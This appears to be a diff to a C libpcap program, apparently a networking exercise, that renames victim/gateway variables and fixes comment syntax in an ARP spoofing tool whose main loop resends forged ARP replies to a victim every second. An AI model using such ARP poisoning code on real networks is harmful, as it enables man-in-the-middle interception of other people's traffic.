@@ -57,7 +57,7 @@ void convert_str_to_ipaddr(char *ip_str, uint8_t *ip)
 }
 /////////////////////////////////////////////////////////
 //get my MAC address from network interface device name
-using IFREQ
+//using IFREQ
 void get_my_mac_addr(char *dev_name, uint8_t *mac)
 {
     struct ifreq s;
@@ -73,7 +73,7 @@ void get_my_mac_addr(char *dev_name, uint8_t *mac)
 }
 ///////////////////////////////////////////////////////////
 //get my IP address from network interface device name
-using IFREQ
+//using IFREQ
 void get_my_ip_addr(char *dev_name, uint8_t *ip)
 {
     struct ifreq s;
@@ -110,8 +110,8 @@ void print_mac(uint8_t *mac_addr)
 }
 ///////////////////////////////////////////////////////////
 //get two pointers of ip address
-return 0 : if two ip addresses are different
-return 1 : if two ip addresses are same
+//return 0 : if two ip addresses are different
+//return 1 : if two ip addresses are same
 int ip_check(uint8_t *des, uint8_t *src)
 {
     for(int i=0; i<IP_ADDR_LEN; i++)
@@ -137,8 +137,8 @@ int main(int argc, char *argv[])
     }
 
     char *dev = argv[1];
-    char *victim_ip = argv[2];
-    char *gateway_ip = argv[3];
+    char *sender_ip = argv[2];
+    char *receiver_ip = argv[3];
 	char errbuf[PCAP_ERRBUF_SIZE];
 
 //network interface handle open
@@ -225,7 +225,7 @@ int main(int argc, char *argv[])
     arp spoofing
     while(1)
     {
-        convert_str_to_ipaddr(gateway_ip, arp_h->Sender_Proto_addr);   //arp sender protocol address=>gateway ip addr
+        convert_str_to_ipaddr(receiver_ip, arp_h->Sender_Proto_addr);  //arp sender protocol address=>gateway ip addr
         arp_h->opcode = htons(ARPOP_REPLY);                            //ARP REPLY
 
         if(pcap_sendpacket(handle, packet, 60) == PCAP_ERROR)
@@ -235,7 +235,7 @@ int main(int argc, char *argv[])
         }
 
         printf(">>Send to poisoned arp packet to victim ");
-        printf("%s/", victim_ip);
+        printf("%s/", sender_ip);
         print_mac(arp_h->Target_HW_addr);
         sleep(1);                                                  //RE-send poisoning packet every 1 sec
     }
